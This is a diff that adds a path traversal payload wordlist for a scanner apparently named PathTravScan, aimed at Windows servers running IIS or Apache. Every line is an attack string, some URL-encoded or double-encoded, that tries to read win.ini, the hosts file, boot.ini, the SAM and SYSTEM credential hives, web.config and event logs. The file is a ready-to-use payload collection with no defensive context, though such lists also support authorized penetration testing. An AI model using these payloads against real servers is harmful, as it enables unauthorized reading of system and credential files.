@@ -1,0 +1,38 @@
+# PathTravScan — Windows LFI Payload Wordlist
+# Targets Windows-based servers (IIS, Apache on Windows)
+
+# ── Win.ini ───────────────────────────────────────────────────────────────────
+../../../../windows/win.ini
+../../../windows/win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+..%5c..%5c..%5c..%5cwindows%5cwin.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+..%2F..%2F..%2Fwindows%2Fwin.ini
+..%252f..%252f..%252fwindows%252fwin.ini
+
+# ── Hosts file ────────────────────────────────────────────────────────────────
+../../../../Windows/System32/drivers/etc/hosts
+../../../Windows/System32/drivers/etc/hosts
+..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts
+
+# ── Boot.ini ──────────────────────────────────────────────────────────────────
+../../../../boot.ini
+../../../boot.ini
+..%5c..%5c..%5cboot.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
+
+# ── SAM / SYSTEM (credential files) ──────────────────────────────────────────
+../../../../Windows/System32/config/SAM
+../../../../Windows/System32/config/SYSTEM
+../../../../Windows/repair/SAM
+..%5c..%5c..%5cWindows%5cSystem32%5cconfig%5cSAM
+
+# ── IIS web.config ────────────────────────────────────────────────────────────
+../../../../inetpub/wwwroot/web.config
+../../../inetpub/wwwroot/web.config
+
+# ── Event logs ────────────────────────────────────────────────────────────────
+../../../../WINDOWS/system32/config/AppEvent.Evt
+../../../../WINDOWS/system32/config/SecEvent.Evt
+../../../../WINDOWS/debug/NetSetup.LOG
